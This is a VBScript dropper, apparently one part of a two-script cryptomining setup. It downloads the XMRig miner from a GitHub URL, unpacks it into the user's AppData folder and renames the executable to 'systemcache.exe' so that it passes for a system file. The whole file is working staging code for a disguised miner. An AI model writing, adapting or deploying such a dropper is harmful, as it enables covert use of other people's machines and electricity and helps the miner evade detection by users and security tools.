' ========================
' 1_Downloader.vbs — XMRig Miner Downloader and Extractor
' This script is designed to be downloaded and executed by 2_MinerConf.vbs.
' Its primary function is to:
' 1. Download the XMRig ZIP package from a specified URL.
' 2. Extract the contents of the ZIP to the designated miner folder.
' 3. Rename the extracted xmrig.exe to systemcache.exe.
' 4. Log its actions to the shared miner.log file.
' ========================

Option Explicit ' Enforce explicit declaration of all variables

' --- Global Object Declarations ---
Dim shell, fso, http, binaryStream

' --- Global Variable Declarations ---
Dim downloadURL, minerFolder, outputPath, logFilePath

' --- Create necessary global objects ---
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
Set binaryStream = CreateObject("ADODB.Stream")

' --- Configuration ---
' URL to the XMRig ZIP file. Make sure this URL points to the raw ZIP file.
downloadURL = "https://github.com/Mrx-coder-1157/xmrig-6.21.0/raw/main/xmrig-6.21.0.zip" ' Verify this URL and ZIP content!

' Destination folder where the miner files will be extracted.
' This should match the expected path in 2_MinerConf.vbs.
minerFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\xmrig-6.21.0\"

' The final name and path of the XMRig executable after renaming.
outputPath = minerFolder & "systemcache.exe"

' Log file path (must match the one in 2_MinerConf.vbs for consolidated logging).
logFilePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\miner.log"

' ===================================
' Script Main Logic
' ===================================

LogToFile "Starting 1_Downloader.vbs execution..."

' --- 1. Create Miner Folder ---
' Ensure the destination folder for the miner exists.
On Error Resume Next ' Temporarily enable OERN for folder creation
If Not fso.FolderExists(minerFolder) Then
    fso.CreateFolder minerFolder
    If Err.Number = 0 Then
        LogToFile "Created miner installation folder: " & minerFolder
    Else
        LogToFile "❌ Failed to create miner installation folder: " & minerFolder & ". Error: " & Err.Description
        MsgBox "Failed to create miner installation folder: " & minerFolder & vbCrLf & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Folder Creation Error"
        WScript.Quit ' Exit if folder cannot be created
    End If
End If
On Error GoTo 0 ' Turn off OERN

' --- 2. Download ZIP File ---
LogToFile "📥 Downloading miner package ZIP from: " & downloadURL
Dim zipFilePath : zipFilePath = minerFolder & "xmrig.zip"

On Error Resume Next ' Use OERN to check HTTP status gracefully
http.Open "GET", downloadURL, False ' Synchronous download
http.Send
On Error GoTo 0 ' Turn off OERN

If http.Status = 200 Then
    ' Save the downloaded binary data to a ZIP file.
    binaryStream.Type = 1 ' Binary mode
    binaryStream.Open
    binaryStream.Write http.ResponseBody
    binaryStream.SaveToFile zipFilePath, 2 ' 2 = Overwrite if file exists
    binaryStream.Close
    LogToFile "✅ Miner package ZIP downloaded to: " & zipFilePath

    ' --- 3. Extract ZIP Contents ---
    LogToFile "📦 Initiating extraction of miner ZIP..."
    Dim objShellApp, objFolder, objFile
    Set objShellApp = CreateObject("Shell.Application")
    Set objFolder = objShellApp.NameSpace(minerFolder) ' Destination for extracted files
    Set objFile = objShellApp.NameSpace(zipFilePath)   ' Source ZIP file

    If Not objFolder Is Nothing And Not objFile Is Nothing Then
        On Error Resume Next ' Handle potential errors during CopyHere
        objFolder.CopyHere objFile.Items ' This extracts contents of the ZIP
        If Err.Number <> 0 Then
            LogToFile "❌ Error during ZIP extraction (CopyHere): " & Err.Description
            MsgBox "Error during ZIP extraction: " & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Extraction Error"
            WScript.Quit
        End If
        On Error GoTo 0

        ' --- Robust Waiting for Extraction Completion ---
        ' This is crucial! Wait until the expected xmrig.exe file appears or times out.
        Dim maxWaitSeconds, currentWait
        maxWaitSeconds = 90 ' Max wait 90 seconds (adjust if your ZIP is very large or system slow)
        currentWait = 0
        ' IMPORTANT: Verify this path matches the *actual* location of xmrig.exe inside your ZIP!
        Dim expectedExtractedPath : expectedExtractedPath = minerFolder & "xmrig-6.21.0\xmrig.exe"

        LogToFile "⏱️ Waiting for extracted xmrig.exe to appear at: " & expectedExtractedPath & " (max " & maxWaitSeconds & "s)..."
        Do While Not fso.FileExists(expectedExtractedPath) And currentWait < maxWaitSeconds
            WScript.Sleep 1000 ' Wait 1 second
            currentWait = currentWait + 1
        Loop

        If Not fso.FileExists(expectedExtractedPath) Then
            LogToFile "❌ Miner extraction timed out or original xmrig.exe not found at: " & expectedExtractedPath & ". Please check ZIP contents."
            MsgBox "Miner extraction failed or timed out. Original xmrig.exe not found after extraction. Check miner.log.", vbCritical, "Extraction Error"
            WScript.Quit
        Else
            LogToFile "✅ Miner extracted successfully. Original executable found."
        End If

        ' --- 4. Move/Rename Executable ---
        If Not fso.FileExists(outputPath) Then ' Only rename if the target file (systemcache.exe) doesn't exist
            On Error Resume Next ' Handle error if move/rename fails
            fso.MoveFile expectedExtractedPath, outputPath
            If Err.Number <> 0 Then
                LogToFile "❌ Error renaming xmrig.exe to systemcache.exe: " & Err.Description
                MsgBox "Error renaming xmrig.exe to systemcache.exe. Check log.", vbCritical, "Rename Error"
                WScript.Quit
            Else
                LogToFile "✅ Renamed xmrig.exe to systemcache.exe at: " & outputPath
            End If
            On Error GoTo 0
        Else
            LogToFile "❗ systemcache.exe already exists at " & outputPath & ", skipping rename."
        End If

        ' --- 5. Clean Up: Delete the downloaded ZIP file ---
        If fso.FileExists(zipFilePath) Then
            On Error Resume Next ' Handle error if deletion fails
            fso.DeleteFile zipFilePath, True ' True = force deletion (read-only)
            If Err.Number = 0 Then
                LogToFile "🗑️ Deleted downloaded ZIP file: " & zipFilePath
            Else
                LogToFile "❌ Could not delete ZIP file: " & zipFilePath & ". Error: " & Err.Description
            End If
            On Error GoTo 0
        End If
    Else
        LogToFile "❌ Error: Shell.Application objects (Namespace for folder or file) are nothing."
        MsgBox "Internal error during ZIP handling. Check miner.log.", vbCritical, "Internal Error"
        WScript.Quit
    End If

Else
    LogToFile "❌ Failed to download miner package ZIP. HTTP Status: " & http.Status & " - " & http.StatusText
    MsgBox "Failed to download miner package ZIP from GitHub. HTTP Status: " & http.Status & vbCrLf & "Please verify the download URL or your internet connection.", vbCritical, "Download Error"
End If

' --- Script End ---
LogToFile "🏁 1_Downloader.vbs finished execution."

' Clean up objects (important for memory management)
Set shell = Nothing
Set fso = Nothing
Set http = Nothing
Set binaryStream = Nothing
' This script should not quit itself unless a critical error occurs,
' allowing 2_MinerConf.vbs to continue after it.

' ===================================
' Subroutine: LogToFile (Local to 1_Downloader.vbs)
' ===================================
' Appends a message with timestamp to the shared miner.log file.
Sub LogToFile(msg)
    On Error Resume Next ' Prevent script crash if logging fails
    Dim file
    ' Use '8' for ForAppending mode, 'True' to create the file if it doesn't exist
    Set file = fso.OpenTextFile(logFilePath, 8, True)
    If Err.Number = 0 Then
        file.WriteLine Now & " - [1_Downloader] - " & msg
        file.Close
    Else
        ' Fallback if logging fails (e.g., permissions issue on log file)
        ' MsgBox "FATAL: Downloader could not write to log file! Error: " & Err.Description & vbCrLf & "Message: " & msg, vbCritical, "Logging Error"
    End If
    On Error GoTo 0
End Sub
